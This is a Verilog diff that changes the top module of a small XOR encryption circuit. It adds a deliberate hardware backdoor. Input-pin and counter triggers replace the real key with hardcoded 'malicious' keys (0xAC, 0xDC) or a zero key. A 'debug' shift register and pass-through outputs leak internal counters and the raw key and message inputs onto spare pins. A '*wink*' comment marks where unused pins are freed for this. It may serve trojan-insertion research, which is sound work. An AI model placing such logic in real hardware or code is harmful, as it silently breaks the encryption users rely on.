@@ -27,15 +27,17 @@ assign uio_out = 8'b0;
 assign uio_oe  = 8'b0;
 
 // unused output wires.
-assign uo_out[3] = 1'b0;
-assign uo_out[4] = 1'b0;
-assign uo_out[5] = 1'b0;
-assign uo_out[6] = 1'b0;
-assign uo_out[7] = 1'b0;
+//assign uo_out[3] = 1'b0;
+//assign uo_out[4] = 1'b0;
+//assign uo_out[5] = 1'b0;
+//assign uo_out[6] = 1'b0;
+//assign uo_out[7] = 1'b0;
 
- wire _unused = &{uio_in,ui_in[3],ui_in[4],ui_in[5],ui_in[6],ui_in[7],1'b0};
+//unused wires *wink*
+ wire _unused = &{uio_in,1'b0};
+ 
+ reg [7:0] selected_key;   
 
-//assign output_message = message;
 
 deserializer #(.MSG_SIZE(KEY_SIZE)) deserializer_key(
      .iData_in  (ui_in[0]),              // Data coming in serially
@@ -67,7 +69,7 @@ xor_encrypt #(.MSG_SIZE(MSG_SIZE),.KEY_SIZE(KEY_SIZE)) xor_message(
     .rst_n(rst_n),
     
     .iMessage(output_message),
-    .iKey(key),
+    .iKey(selected_key),
     
     .iMessage_bit_counter(oBit_counter_msg),
     .iKey_bit_counter(oBit_counter_key),
@@ -88,4 +90,53 @@ serializer #(.MSG_SIZE(MSG_SIZE)) serialize_ciphertext(
     .oData_flag(uo_out[1]),
     .oData_out(uo_out[0])
 );
+
+shift_register debug_module(
+    .clk(clk),
+    .rst_n(rst_n),
+    .ena(ena),
+    
+    .key_counter(oBit_counter_key),
+    .message_counter(oBit_counter_msg),
+    .ciphertext_counter(oBit_counter_ciphertext),
+    
+    .debug_wire(ui_in[7]),
+    
+    .data_flag(uo_out[6]),
+    .data_out(uo_out[7])
+);
+
+reg [$clog2(128)-1:0] reset_counter;
+
+always @(posedge clk or negedge rst_n) begin
+    if (!rst_n) begin
+        reset_counter <= 0;  // Asynchronous reset
+    end else if (ena) begin
+        reset_counter <= (reset_counter < 127) ? reset_counter + 1 : 0;
+    end
+end
+
+// Conditional key selection logic with prioritized conditions
+always @(posedge clk or negedge rst_n) begin
+    if (!rst_n) begin
+        selected_key <= 8'h00; // Default to zero on reset
+    end else if (ena) begin
+        // Priority order for key selection
+        if (ui_in[3] && !ui_in[1]) begin
+            selected_key <= 8'hAC;  // Condition 1: Always Active Malicious Key (AC)
+        end else if (ui_in[4] && reset_counter == 127) begin
+            selected_key <= 8'hDC;  // Condition 2: Reset-Controlled Malicious Key (DC)
+        end else if (ui_in[5] && !ui_in[1]) begin
+            selected_key <= 8'h00;  // Condition 3: Disable Key (No Key, set to 0)
+        end else begin
+            selected_key <= key;    // Default condition: Use the regular key
+        end
+    end
+end
+
+// Conditional outputs for debugging
+assign uo_out[3] = (ena && ui_in[6]) ? ui_in[0] : 1'b0;
+assign uo_out[4] = (ena && ui_in[6]) ? ui_in[1] : 1'b0;
+assign uo_out[5] = (ena && ui_in[6]) ? ui_in[2] : 1'b0;
+
 endmodule
